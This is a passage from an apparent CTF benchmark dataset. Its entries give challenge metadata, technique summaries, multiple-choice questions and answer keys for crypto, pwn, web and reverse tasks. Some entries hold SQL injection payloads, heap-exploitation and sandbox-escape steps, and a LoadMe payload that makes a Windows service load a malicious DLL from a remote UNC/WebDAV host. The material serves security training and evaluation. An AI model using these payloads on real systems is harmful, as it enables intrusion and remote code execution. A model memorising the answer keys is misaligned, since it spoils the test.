            "In a cryptography challenge focusing on the CKKS scheme and the exploit of the secret error (`e`) during decryption, which formula correctly represents the method to derive the secret key (`s`) using the leaked information? - A. `s = c_1 * c_0^{-1} + e` - B. `s = (c_1 - m) * c_0^{-1}` - C. `s = (c_1 - (m + e)) * c_0^{-1}` - D. `s = c_1 + m * e^{-1}`",
            "When dealing with inversion issues within `Zmod(2^100)` for the decryption process in a cryptographic challenge, which alternative approach is recommended to possibly overcome these difficulties? - A. Compute directly in `ZMod(2^100)` ignoring inversion issues. - B. Solve in `ZMod(2)` for a higher likelihood of invertibility. - C. Increase the modulus size to improve invertibility. - D. Avoid inversion altogether by altering the encryption mechanism."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "LED",
        "write_up": "dataset/raw/LED.md",
        "type": "crypto",
        "competition": [
            "CodeBlue/2018/Quals",
            "https://ctftime.org/event/636/tasks/"
        ],
        "score": 315,
        "max_score": 500,
        "difficulty": 0.63,
        "knowledge": [
            "In cryptographic challenges involving encryption algorithms with a stepwise transformation process, if each step's impact on the final output is isolated and understood, it allows for systematic brute-forcing of key portions. Specifically, when an encryption function's operation can be dissected into stages where specific subsets of the key affect distinct subsets of the output independently, and one of the stages involves a predictable or non-encrypting manipulation such as permutation, identifying the relation between key subsets and their corresponding output subsets enables targeted brute-forcing. This approach is especially viable when the complexity added by one of the function's final steps (like a permutation) does not alter the actual encryption but merely rearranges the output, as this rearrangement can be decoded or accounted for separately.",
            "In encryption challenges where the encryption process involves multiple rounds of transformation and part of the encryption key is known or can be brute-forced, it's effective to use the partial key to reverse intermediate stages of the encryption process. This allows for the discovery of internal states or permutations used within the function, facilitating the brute-forcing of the remaining parts of the key. When an algorithm applies transformations in rounds, knowledge of the outcomes of specific rounds (like knowing the effect of all rounds except the last) can be leveraged to strip away the algorithm's complexity layer by layer, thereby simplifying the brute-forcing of any remaining unknown key portions or internal states."
        ],
        "question": [
            "In a cryptographic challenge, you are given an encryption algorithm that can be broken down into steps, where each step's effect on the output can be isolated. It is identified that specific subsets of an encryption key affect distinct subsets of the output independently. Knowing this, how could you effectively reduce the complexity of brute-forcing the encryption key, when one of the final steps of the algorithm is a predictable permutation that does not encrypt but merely rearranges the output? - A. Brute-force the encryption key as a whole without considering the internal structure of the algorithm. - B. Randomly guess the permutation and then attempt to brute-force the key subsets based on those guesses. - C. Focus on brute-forcing the permutation first without understanding its impact on the key-output relationship. - D. Identify the relationship between key subsets and their corresponding output subsets to target brute-forcing efforts on isolated parts of the key.",
            "When dealing with an encryption algorithm that performs multiple rounds of transformation and you have successfully brute-forced or otherwise obtained the first part of the encryption key, which approach should you take next to continue decrypting or further understanding the algorithm's operation? - A. Ignore the part of the key you've obtained and focus on brute-forcing the second half of the key as if starting from scratch. - B. Use the known part of the key to reverse intermediate stages of the encryption process, aiming to uncover internal states or used permutations, thereby facilitating the brute-forcing of the remaining parts of the key. - C. Focus solely on attacking the encryption algorithm's permutation without utilizing the known part of the key. - D. Encrypt new data with the known key part to gather more information about the encryption process, disregarding the algorithm's round-based transformation."
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "Left Foot Two Stomps",
        "write_up": "dataset/raw/Left Foot Two Stomps.md",
        "type": "crypto",
        "competition": [
            "DawgCTF/2020",
            "https://ctftime.org/event/1030/tasks/"
        ],
        "score": 250,
        "max_score": 500,
        "difficulty": 0.5,
        "knowledge": [
            "When confronted with RSA encryption & a small `n`, factorize `n` to find `p` and `q`. Then, compute the modular inverse of `e` modulo `(p-1)*(q-1)` to find `d`, the decryption key. This can decrypt the ciphertext when given in an array, applying the formula `plaintext[i] = pow(ciphertext[i], d, n)` for each element.\n   - Example code snippet for decryption with small `n`:\n     ```python\n     def egcd(a, b):  \n         if a == 0:  \n             return (b, 0, 1)  \n         else:  \n             g, y, x = egcd(b % a, a)  \n             return (g, x - (b // a) * y, y)\n     \n     def modinv(a, m):  \n         g, x, y = egcd(a, m)  \n         if g != 1:  \n             raise Exception('modular inverse does not exist')  \n         else:  \n             return x % m\n     \n     p = # factor of n\n     q = n // p\n     e = # public exponent\n     d = modinv(e, (p-1)*(q-1))\n     plaintext = [pow(a, d, n) for a in cipher] # cipher is the array of ciphertext integers\n     ```",
            "Encoded messages may utilize multiple layers of encryption or encoding, requiring a step-by-step decoding approach. Recognize the pattern or hints in decrypted messages to apply the correct decryption or decoding method successively, using tools like Vigenere cipher decoders, Base64 decoders, and ROT cipher decoders. Identifying the correct sequence to apply these methods may be necessary to completely decode the original plaintext.\n   - Sequence example from the challenge:\n     1. Decrypt RSA encrypted message to get a string that appears to be Vigenere cipher encrypted.\n     2. Use the provided key to decode the Vigenere cipher.\n     3. Decode the result from Base64.\n     4. Apply ROT cipher decoding to the Base64 decoded message to get the final plaintext."
        ],
        "question": [
            "In the context of a CTF challenge where RSA encryption has been utilized and the public key components `n` and `e` are given as `n=960242069` and `e=347`, what is the next step to decrypt ciphertext represented as an array of integers after factoring `n` into `p` and `q`? - A. Calculate `p+q` and use it as the decryption key. - B. Multiply `p` and `q` to get a new `n` and use this for decryption. - C. Compute the modular inverse of `e` modulo `(p-1)*(q-1)` to find `d`, the decryption key. - D. Sum `p` and `q` and subtract `e` to find the encryption key. ",
            "After decrypting an RSA encrypted message in a CTF challenge, you obtain a string that suggests another layer of encryption or encoding. When the decrypted text includes a specific pattern that suggests Vigenere cipher with a provided key, followed by a suggestion of Base64 encoding evident from `=` at the end, and finally hints at ROT cipher encoding, what should be the correct sequence of decryption or decoding methods to apply next? - A. Decode using ROT cipher, follow with Vigenere cipher decoding, and finally decode Base64. - B. First decode Base64, then apply Vigenere cipher decoding, and finally decode using ROT cipher. - C. Start with Vigenere cipher decoding, then decode using ROT cipher, and finally decode Base64. - D. Apply Vigenere cipher decoding first, followed by Base64 decoding, and then use ROT cipher decoding. "
        ],
        "answer": [
            "C.",
            "D."
        ]
    },
    {
        "name": "Lenore Blum",
        "write_up": "dataset/raw/Lenore Blum.md",
        "type": "crypto",
        "competition": [
            "CyberHeroines/2023",
            "https://ctftime.org/event/2054/tasks/"
        ],
        "score": 300,
        "max_score": 400,
        "difficulty": 0.75,
        "knowledge": [
            "When faced with challenges involving the Blum Blum Shub (BBS) pseudorandom number generator, one can reverse-engineer the algorithm if the seed is known and if the parameters p and q used in the algorithm can be determined or inferred from given information. Specifically, if p and q must be primes congruent to 3 mod 4, and the seed is manipulated by a known factor (e.g., multiplied by a fixed value), these values can be reverse-engineered to predict the next numbers generated by the BBS algorithm. This approach is effective when the challenge involves predicting or replicating numbers produced by the BBS algorithm based on an initial seed provided by the challenge.",
            "In challenges where prime numbers are generated or used (especially in cryptographic contexts like the BBS algorithm or other prime-dependent algorithms), implementing or extracting functions to find prime numbers meeting specific criteria (e.g., congruent to 3 mod 4) and to verify if a number is prime can be pivotal. These functions are universally applicable across a variety of CTF crypto challenges involving prime numbers. Additionally, being able to implement or adapt these prime-related functions dynamically within scripts allows for automation and efficient solving of challenges that involve calculating or predicting values based on prime numbers. \n\nExample of calculating a prime number congruent to 3 mod 4:\n```python\ndef find_prime_congruent_to_3_mod_4(param):  \n   local_10 = param  \n   while True:  \n       cVar1 = is_prime(local_10)  \n       if cVar1 and (local_10 & 3) == 3:  \n           break  \n       local_10 += 1  \n   return local_10\n```"
        ],
        "question": [
            "In the given CTF scenario, the seed value is manipulated by being multiplied by a specific known factor (1337) before being used in the Blum Blum Shub (BBS) algorithm. Given this scenario, which of the following best describes a method to reverse-engineer or predict the next number generated by the BBS algorithm? - A. Multiply the next expected number by the same known factor to predict its value. - B. Use the seed value directly without modification to predict the next number. - C. Divide the seed value by the known factor to revert to the original seed before applying the BBS algorithm. - D. Add the known factor to the seed value to calculate the next number in the sequence. ",
            "In cryptographic challenges involving prime numbers, specifically those requiring finding primes congruent to 3 mod 4, which of the following Python functions correctly implements the logic to find such a prime number, given a starting parameter? - A.```python def is_prime_candidate(param): if param % 4 == 3: return True return False ``` - B.```python def get_next_prime(param): while True: param += 1 if is_prime(param): return param ``` - C.```python def find_prime_congruent_to_3_mod_4(param): local_10 = param while True: cVar1 = is_prime(local_10) if cVar1 and (local_10 & 3) == 3: break local_10 += 1 return local_10 ``` - D.```python def check_prime_mod(param): return param % 3 == 0 ``` "
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "Less Effort Required",
        "write_up": "dataset/raw/Less Effort Required.md",
        "type": "crypto",
        "competition": [
            "UMDCTF/2020",
            "https://ctftime.org/event/1040/tasks/"
        ],
        "score": 300,
        "max_score": 800,
        "difficulty": 0.375,
        "knowledge": [
            "When confronted with RSA encryption where the public exponent 'e' is notably small, an effective approach involves directly calculating the e-th root of the ciphertext. This technique bypasses the need for private key information when 'e' and the ciphertext are suitably small, hence simplifying the decryption process. To accomplish this, one can utilize libraries like gmpy in Python, which supports the computation of exact roots for integers.\n\nExample payload:\n```python\nimport gmpy\nc = 40030182544273856015788999062464973403472186630147528555052489762516210821795493031619376345647069575950526306492922573846162431037037824967074058132327917359025595463728944947118480605422897682821384491771926743103021286982319660969379132360886299787840185308892024028684314873509707776\ne = 5\nm = gmpy.root(c,e)[0]\n```",
            "To transform an integer back into its original byte form after decryption, Python's `Crypto.Util.number` library provides the `long_to_bytes` method. This conversion is crucial for RSA encryption challenges where plaintext messages are converted to integers for encryption and must be reverted to interpret the decrypted message accurately.\n\nExample usage:\n```python\nfrom Crypto.Util.number import long_to_bytes\n# Assuming 'm' is the decrypted integer message\nflag = long_to_bytes(m)\nprint(flag)\n```"
        ],
        "question": [
            "In an RSA encryption challenge with a public key exponent of 5, which Python library and function are best suited for computing the exact e-th root of the ciphertext to simplify decryption without the private key? - A. Use `NumPy` with the function `np.sqrt` - B. Use `PyCryptoDome` with the function `rsa.decrypt` - C. Use `gmpy` with the function `root` - D. Use `math` with the function `pow`",
            "After successfully decrypting an RSA ciphertext to an integer, which method from the `Crypto.Util.number` library should be used to convert this integer back into its original byte form to reveal the plaintext message? - A. `bytes_to_long(m)` - B. `long_to_bytes(m)` - C. `int_to_bytes(m)` - D. `bytes_to_int(m)`"
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "LessEQualmore",
        "write_up": "dataset/raw/LessEQualmore.md",
        "type": "pwn",
        "competition": [
            "HITCON/2023/Quals",
            "https://ctftime.org/event/2019/tasks/"
        ],
        "score": 248,
        "max_score": 500,
        "difficulty": 0.496,
        "knowledge": [
            "When tackling challenges involving a subleq virtual machine or similar esoteric programming environments that perform computations or verifications based on user input, it can be highly effective to use taint analysis combined with symbolic execution. This approach enables the identification of input-dependent branches and computation paths. By representing input as symbolic variables and tracing their influence through the program's logic, one can pinpoint which operations are critical for determining the correctness of the input. This is particularly useful in environments where the program self-modifies or where the logic is opaque.",
            "In scenarios where a program performs comparisons that are fundamental to its control flow (e.g., verifying a password or flag), optimizing the search for the correct input can often hinge on the assumption that comparisons may involve some constant or fixed pattern. This means that rather than looking for arbitrary relations between input characters, it may be more efficient to search for equations where input characters are compared either to each other with some offset or directly against constant values. This assumption can significantly narrow down the search space when combined with symbolic execution and taint analysis, making it feasible to identify the correct input even when dealing with a large number of possibilities or a complex program structure."
        ],
        "question": [
            "In the context of analyzing a subleq virtual machine's behavior when verifying user input, suppose you aim to identify how user input influences the program's control flow. Considering this goal, which approach would be most effective for analyzing and tracing the input dependency throughout the program's execution? - A. Employing dynamic analysis exclusively to observe runtime behavior without distinguishing input influence. - B. Relying purely on static code analysis to examine the source code without executing the program. - C. Using taint analysis combined with symbolic execution to track how symbolic variables (user input) affect the computation and identify input-dependent branches. - D. Implementing a straightforward brute-force method that tries all possible input combinations to find the correct one without analyzing the program's structure.",
            "In an effort to optimize the search for the correct input in a program that involves critical comparisons within its control flow, such as flag verification, which of the following assumptions could most effectively narrow down the search space in combination with symbolic execution and taint analysis? - A. Assuming that all comparisons are purely random and have no relation to each other, thus requiring exhaustive search without focusing on patterns. - B. Assuming that input characters are only compared against each other without any constant or fixed pattern, leading to a wide search space. - C. Assuming that comparisons may involve some constant or fixed pattern, potentially allowing for a more targeted search for equations where input characters are compared either to each other with some offset or directly against constant values. - D. Ignoring the potential for comparisons to involve constants or patterns and focusing solely on the length of the input as the primary factor in optimization."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Life on Mars",
        "write_up": "dataset/raw/Life on Mars.md",
        "type": "web",
        "competition": [
            "b01lers/2020",
            "https://ctftime.org/event/974/tasks/"
        ],
        "score": 100,
        "max_score": 300,
        "difficulty": 0.3333333333333333,
        "knowledge": [
            "When facing a web challenge that involves JavaScript querying a server's endpoint, it's important to inspect the JavaScript code for potential vulnerabilities. Exploiting SQL injection vulnerabilities can be performed by manipulating the input parameters in AJAX requests if the server endpoint does not properly sanitize input. This can lead to unauthorized access to database information. Example Payload: `/query?search=' UNION SELECT 1, 2 --`",
            "Identifying the DBMS version is crucial for tailoring SQL injection attacks. Specific DBMS versions have particular vulnerabilities or support certain syntax that can be exploited. Once the DBMS version is known (e.g., MySQL 5.7.29), targeted SQL injection queries can be crafted to extract valuable data, including database schemas, table names, and sensitive data. Example Payload: `amazonis_planitia UNION SELECT @@version, 1`"
        ],
        "question": [
            "In a scenario where a JavaScript function is used to perform AJAX requests to the server, such as `$.ajax({ type: \"GET\", url: \"/query?search=\" + query })`, how can an attacker exploit a SQL injection vulnerability in the server's handling of the query parameter? - A. By submitting a form with carefully crafted input - B. By intercepting the request with a proxy and modifying the SQL query - C. By manipulating the query parameter in the request URL to include SQL syntax, e.g., `UNION SELECT 1, 2 --` - D. By uploading a malicious file that contains SQL commands",
            "When conducting SQL injection attacks, how can determining the DBMS version, such as MySQL 5.7.29, be advantageous for an attacker? - A. It allows the attacker to identify the server's operating system - B. It enables the attacker to choose the correct programming language for the payload - C. It helps the attacker in crafting targeted queries that exploit version-specific vulnerabilities or syntax - D. It allows the attacker to bypass network firewalls"
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Light N' Easy",
        "write_up": "dataset/raw/Light N' Easy.md",
        "type": "crypto",
        "competition": [
            "HackCon/2018",
            "https://ctftime.org/event/652/tasks/"
        ],
        "score": 50,
        "max_score": 200,
        "difficulty": 0.25,
        "knowledge": [
            "In challenges involving encoding or encrypting messages with hardware interfaces, such as 7-segment displays, binary digits can represent the state (on/off) of each segment. Understanding how these displays map to alphanumeric characters is critical for decoding messages. A common pattern is using a binary sequence to indicate the segments that should be lit to form each letter or number. Mapping these sequences correctly can reveal hidden messages or keys contained within binary data or hardware signals.",
            "For tasks requiring the interpretation of binary input as visual output, creating a software representation of the hardware component (like a 7-segment display) can be beneficial. This involves programming the logic that translates binary inputs into a readable format, considering the hardware's segmentation and how each segment corresponds to the display's part. Implementing a \"pretty print\" function that visually simulates the hardware's display in text or graphic format on a computer can be useful for debugging or solving challenges that involve complex patterns or encoded messages.\n\nExample pseudo-code for interpreting a 7-segment display binary input:\n```\nsegments = {\n    '0': '0111111',\n    '1': '0000110',\n    '2': '1011011',\n    '3': '1001111',\n    ... \n    ' ': '0000000'  # Represents an unlit display.\n}\n\ndef decode_binary_to_segments(binary_input):\n    binary_sequences = binary_input.split('-')  # Assuming '-' is used as a separator for binary inputs\n    decoded_characters = ''\n    for sequence in binary_sequences:\n        for char, binary in segments.items():\n            if sequence == binary:\n                decoded_characters += char  # Find which character the binary sequence represents\n                break\n    return decoded_characters\n\n# Display the output in a visually meaningful way, such as converting it to an ASCII art representation of the segments.\n```"
        ],
        "question": [
            "When encoding alphanumeric characters for a 7-segment display, a binary sequence represents the state (on or off) of each segment. For example, the binary sequence '0111111' represents which of the following characters? - A. The letter 'A' - B. The number '0' - C. The letter 'E' - D. The number '8'",
            "In creating a software representation of a 7-segment display for interpreting binary input as visual output, what does the binary sequence '0000000' typically represent? - A. The number '8' with all segments lit - B. An error or undefined character - C. A fully lit display showing all segments - D. An unlit display or a space character"
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Lil Chompy",
        "write_up": "dataset/raw/Lil Chompy.md",
        "type": "reverse",
        "competition": [
            "Sunshine/2020",
            "https://ctftime.org/event/992/tasks/"
        ],
        "score": 700,
        "max_score": 700,
        "difficulty": 1.0,
        "knowledge": [
            "In heap exploitation challenges involving a custom heap implementation or complex allocation/deallocation logic, identifying and exploiting Use After Free (UAF) vulnerabilities can be crucial. After freeing a heap object, if the program continues to use the pointer to that object, an attacker can manipulate the heap to control the data at the freed location, leading to leaks or arbitrary code execution. When facing a UAF scenario, it's essential to carefully plan the heap layout and operations to turn the vulnerability into a powerful primitive for further exploitation. This often involves renaming or reallocating objects to control the data at the target location.\n   \n   **Example payload approach:** \n   - Create an object to occupy a desired location in the heap.\n   - Free the object but retain its pointer (UAF condition).\n   - Perform operations (e.g., add, rename) to control or leak data at the freed object's location.",
            "When exploiting heap-based vulnerabilities to achieve remote code execution (RCE), finding a way to leak addresses of critical sections like the libc base address, heap, stack, or even the binary itself is crucial to bypass ASLR. This can be achieved by manipulating the heap layout to leak these addresses through controlled format strings or UAF vulnerabilities. Once a leak is obtained, it can be used to calculate the base addresses of these segments, allowing for precise targeting of gadgets or functions like `system()` for RCE. This typically involves chaining multiple steps: leaking a heap pointer, using this to leak a libc address, and then calculating the base addresses required for the final payload.\n\n   **Example leak exploitation:** \n   - Use UAF to overwrite a heap pointer with a known libc address or GOT entry.\n   - Trigger an operation that prints or uses the corrupted pointer to leak the address.\n   - Calculate the base address of libc (or other targeted segments) using the leaked address and known offsets."
        ],
        "question": [
            "In a scenario involving heap exploitation where an attacker wants to manipulate the heap after freeing an object without reallocation, which technique is best suited to control the data at the previously freed object's location? - A. Modify the object's size to prevent its reuse. - B. Allocate a new object of the exact size to occupy the freed space. - C. Use the freed object's pointer to directly overwrite its data. - D. Rename or reallocate objects to control the data at the freed location.",
            "When attempting to bypass ASLR in a heap exploitation challenge by leaking addresses, which approach is effective in obtaining the base address of libc to facilitate remote code execution? - A. Allocate and free chunks until a libc address is accidentally disclosed. - B. Use a heap overflow to overwrite GOT entries with arbitrary values. - C. Manipulate the heap to leak a libc address through controlled format strings or UAF vulnerabilities and calculate the base addresses. - D. Guess the libc base address by brute-forcing the address space."
        ],
        "answer": [
            "D.",
            "C."
        ]
    },
    {
        "name": "LINDA",
        "write_up": "dataset/raw/LINDA.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 169,
        "max_score": 477,
        "difficulty": 0.35429769392033544,
        "knowledge": [
            "For cryptographic challenges focusing on public key encryption, if the public key parameter \\( p - 1 \\) is smooth (meaning it's factored entirely into small primes), one can factor \\( p - 1 \\) using trial division and Lenstra elliptic-curve factorization (ECM). This factorization allows the application of the Pohlig-Hellman algorithm to compute discrete logarithms efficiently, offering a pathway to decrypt the message.",
            "In scenarios where encryption relies on parameters \\( u, v, w \\) as part of the public key and messages are encrypted as \\( ca, cb, cc \\) with given relations under modulus \\( p \\), one can exploit the computed discrete logarithms \\( r, s \\) of \\( ca, cb \\) (with bases \\( u, v \\) respectively) to directly decrypt the encrypted message \\( cc \\) by inversing the exponentiation operation. Specifically, if \\( ca \\equiv u^r \\mod p \\) and \\( cb \\equiv v^s \\mod p \\), then the message \\( m \\) can be obtained by computing \\( m \\equiv ccw^{-(r + s)} \\mod p \\).\n\nExample payload for decryption using Sage:\n```python\nfrom minipwn import remote \nfrom Crypto.Util.number import long_to_bytes\n\nrem = remote(\"07.cr.yp.toc.tf\", 31010)\nfor _ in range(10):  \n   rem.recvline()  \nrem.sendline('e')  \np = int(rem.recvline().strip()[4:])  \nu = int(rem.recvline().strip()[4:])  \nv = int(rem.recvline().strip()[4:])  \nw = int(rem.recvline().strip()[4:])  \nrem.recvlines(5)  \nrem.sendline('s')  \nca, cb, cc = map(int, rem.recvuntil(\")\").strip()[7:-2].split(b', '))  \nr = discrete_log(Mod(ca, p), Mod(u, p))  \ns = discrete_log(Mod(cb, p), Mod(v, p))  \nm = cc * power_mod(w, -(r + s), p) % p  \nprint(long_to_bytes(m).decode())  \n```"
        ],
        "question": [
            "When decrypting an encrypted message in a cryptographic system where \\(p - 1\\) is known to be smooth, which of the following methods is recommended for factoring \\(p - 1\\) to apply the Pohlig-Hellman algorithm efficiently? - A. Perform basic modular arithmetic on \\(p - 1\\) to find its factors. - B. Use RSA algorithm to decrypt \\(p - 1\\) without factoring. - C. Utilize trial division and Lenstra elliptic-curve factorization (ECM) to factor \\(p - 1\\). - D. Apply the Chinese Remainder Theorem directly to \\(p - 1\\) without factoring. ",
            "In a public-key encryption system where the encryption function utilizes parameters \\(u, v, w\\) and encrypts a message \\(m\\) as \\(cc\\) with the relations \\(ca \\equiv u^r \\mod p\\), \\(cb \\equiv v^s \\mod p\\), and \\(m \\) encrypted as \\(cc\\) under modulus \\(p\\), how can one decrypt \\(cc\\) to retrieve \\(m\\) given that the discrete logarithms \\(r, s\\) of \\(ca, cb\\) are computed? - A. Compute \\(m \\equiv cc + w^{(r + s)} \\mod p\\). - B. Compute \\(m \\equiv ccw^{-(r + s)} \\mod p\\). - C. Determine \\(m\\) by adding \\(r\\) and \\(s\\), then multiplying by \\(cc\\). - D. Use \\(r\\) and \\(s\\) to exponentiate \\(cc\\) under modulus \\(p\\). "
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "little riddle",
        "write_up": "dataset/raw/little riddle.md",
        "type": "pwn",
        "competition": [
            "CodeBlue/2018/Quals",
            "https://ctftime.org/event/636/tasks/"
        ],
        "score": 363,
        "max_score": 500,
        "difficulty": 0.726,
        "knowledge": [
            "In scenarios where a Ruby application is sandboxed with `$SAFE=3`, a bypass can be achieved by leveraging `Fiddle::Pointer` due to its lack of taint checking, allowing for arbitrary memory read and write operations. This method can be applied universally in similar sandboxed environments where direct memory manipulation is restricted but Fiddle is accessible. A detailed exploitation process involves determining libc offsets, using `Fiddle::Pointer` for memory operations to calculate libc base address, and crafting a payload for arbitrary code execution.\n   - Example payload setup:\n     ```ruby\n     libc_base = main_arena - libc_offset[\"main_arena\"]\n     payload << [libc_base + libc_offset[\"pop_rdi_ret\"], ptr.to_i].pack(\"Q*\")\n     ```",
            "For challenges involving WebAssembly, exploiting an off-by-one buffer overflow in conjunction with the characteristics of Emscripten's dlmalloc implementation and WebAssembly's lack of readonly memory can lead to arbitrary code execution. Specifically, by making chunks overlap, manipulating WebAssembly module\u2019s memory to modify function pointers or string constants, an attacker can run arbitrary JavaScript code. This approach is particularly effective in WebAssembly compiled applications where direct memory management functions (like dlmalloc) are used and the application logic allows for overflow vulnerabilities.\n   - Example steps for exploitation:\n     1. Exploit off-by-one buffer overflow to create overlapping chunks.\n     2. Overwrite an existing letter's `filter` function pointer to point to a controllable function (`__stdio_read` in this case).\n     3. Use the overridden function to modify application memory, such as changing a string constant to inject and execute JavaScript code.\n     4. Trigger the execution of the modified constant/function pointer to run arbitrary code."
        ],
        "question": [
            "When attempting to bypass a Ruby sandbox set at `$SAFE=3` level using `Fiddle::Pointer` for a memory write operation, which of the following lines of code correctly represents the exploitation step to write to an arbitrary memory location? - A. `payload << [libc_base + 0xdeadbeef].pack(\"L_\")` - B. `Fiddle::Pointer.new(0xdeadbeef)[0, 8] = [libc_base].pack(\"L\")` - C. `payload << [libc_base + libc_offset[\"pop_rdx_ret\"], 0xdeadbeef].pack(\"Q*\")` - D. `Fiddle::Pointer.new(libc_base + libc_offset[\"write\"]).write([0xdeadbeef].pack(\"Q\"))`",
            "In the context of exploiting WebAssembly compiled applications, particularly taking advantage of an off-by-one buffer overflow flaw in combination with flaws in dlmalloc and WebAssembly's memory model, which step is vital for achieving arbitrary code execution by modifying function pointers or string constants? - A. Overwriting a 'malloc' function pointer to trigger a JavaScript console log. - B. Changing a non-vital data structure to bypass dlmalloc checks. - C. Overwriting an existing letter's `filter` function pointer with the address of a controlled code execution primitive like `__stdio_read`. - D. Directly editing WebAssembly bytecode to alter functionality."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "LIVE MATH LOVE",
        "write_up": "dataset/raw/LIVE MATH LOVE.md",
        "type": "pwn",
        "competition": [
            "TAMUctf/2022",
            "https://ctftime.org/event/1557/tasks/"
        ],
        "score": 184,
        "max_score": 500,
        "difficulty": 0.368,
        "knowledge": [
            "In challenges involving binary exploitation with floating point inputs, we can leverage the fact that specific floating point representations can correspond to memory addresses or control flow altering values when improperly handled. By crafting a floating point value that is carefully chosen to represent the memory address of a desired function (e.g., a function that spawns a shell), control of the program's execution can be obtained. This technique is effective in scenarios where the binary reads floating point numbers and uses them in a manner that impacts control flow or function pointers.\n\n   - Example Payload: `5.883707532277683e-39` corresponds to the floating point representation that, due to the binary's improper handling, leads to the execution of a designated function (such as a shell spawning function).",
            "When preparing an exploit for a binary that relies on specific input formats (e.g., floating point numbers), Python's struct module can be pivotal. It allows for the packing and unpacking of structured data into bytes, suitable for directly interacting with binary programs that expect complex input types. This method is crucial when an exploit needs to send bytes that represent floating point numbers, addresses, or other structured data to a vulnerable program.\n\n   - Example Code Snippet: `struct.unpack('!f', '\\x00\\x40\\x11\\x62')[0]` converts a sequence of bytes into its floating point representation that can be sent as input to the binary."
        ],
        "question": [
            "In a scenario where a vulnerable calculator program reads floating point numbers for mathematical operations and can be exploited to execute a function that spawns a shell, what floating-point value should be inputted to redirect the control flow to the address of the shell spawning function, given that the address is correctly represented by a specific floating-point value? - A. 5.883707532277683e-39 - B. 1.0 - C. 2.718281828459045 - D. 3.141592653589793",
            "When exploiting a vulnerability in a program that reads floating point inputs to execute arbitrary code, which Python module and function are essential for converting a byte sequence representing a memory address into a floating-point number to facilitate the exploit? - A. `struct.unpack()` - B. `math.ceil()` - C. `os.system()` - D. `float.fromhex()`"
        ],
        "answer": [
            "A",
            "A"
        ]
    },
    {
        "name": "LLLattice",
        "write_up": "dataset/raw/LLLattice.md",
        "type": "reverse",
        "competition": [
            "pbctf/2023",
            "https://ctftime.org/event/1763/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When reverse engineering FPGA bitstreams, especially for Lattice FPGAs, identifying the specific FPGA model from the bitstream's header can provide crucial context for the decompilation process. This knowledge allows for a more targeted approach in extracting and simulating the design's functionality. Knowing the exact FPGA model (e.g., `LFE5U-25F-6CABGA381`) can be instrumental in selecting the appropriate tools and techniques for decompilation and analysis.",
            "In scenarios involving reverse engineering of hardware designs (e.g., FPGA bitstreams), utilizing a combination of decompiler tools, simulation software, and schematic analysis can be highly effective. Specifically, for Lattice FPGA bitstreams, utilizing VoidMercy's Lattice ECP5 Bitstream Decompiler for extracting Verilog code, followed by RTL simplification with yosys, and conducting simulation and schematic analysis with tools like Vivado, facilitates a comprehensive understanding of the design. This approach is particularly useful when facing complex hardware reversing challenges, aiding in the identification of key components such as IO ports, clock inputs, and functional blocks within the design."
        ],
        "question": [
            "When beginning the reverse engineering process of an FPGA bitstream, why is identifying the specific FPGA model from the bitstream's header beneficial? - A. It allows for the customization of the decompilation process, tailoring it to the architecture and features of the specific FPGA. - B. It provides a code for discount on FPGA development tools. - C. It determines the programming language used to write the original source code. - D. It identifies the manufacturer of the microcontroller used in conjunction with the FPGA. ",
            "In the process of reverse engineering hardware designs like FPGA bitstreams, what is the advantage of using a combination of decompiler tools, simulation software, and schematic analysis? - A. It significantly reduces the overall project cost by utilizing open-source tools exclusively. - B. It enables a deeper understanding of the hardware design by extracting Verilog code, simplifying RTL, and visualizing schematic interconnections. - C. It makes the design compatible with all types of FPGAs, not just Lattice models. - D. It allows for the physical alteration of the FPGA without the need for electrical testing. "
        ],
        "answer": [
            "A",
            "B"
        ]
    },
    {
        "name": "LoadMe",
        "write_up": "dataset/raw/LoadMe.md",
        "type": "misc",
        "competition": [
            "insomnihack/2022/Quals",
            "https://ctftime.org/event/1505/tasks/"
        ],
        "score": 243,
        "max_score": 451,
        "difficulty": 0.5388026607538803,
        "knowledge": [
            "In a pwn challenge involving exploitation of Windows systems without a provided binary, identifying input handling vulnerabilities can lead to arbitrary code execution. Specifically, overrunning input buffers with more than 64 characters may trigger errors that suggest the application is attempting to load a Dynamic Link Library (DLL) using that input. This behavior can be exploited by crafting inputs that make the application load a malicious DLL hosted on a network share, achieving Remote Code Execution (RCE). A payload example for triggering the DLL loading mechanism is a long series of commas followed by a UNC path to a malicious DLL, e.g., `,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\\\\live.sysinternals.com\\tools\\yourdll.dll`.",
            "If Internet Service Providers (ISPs) or hosting providers block SMB ports (139 and 445) which are commonly used for network shares, consider using WebDAV as an alternative for hosting a malicious DLL. Windows attempts to resolve UNC paths can fall back to using WebDAV, which allows specifying a custom port in the UNC path, thus bypassing the port block. Additionally, setting up a WebDAV share on a server and directing the vulnerable application to load a DLL from this location can circumvent common network restrictions. An example payload that leverages WebDAV for DLL loading is: `,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\\\\1.2.3.4@8080\\data\\malicious.dll`."
        ],
        "question": [
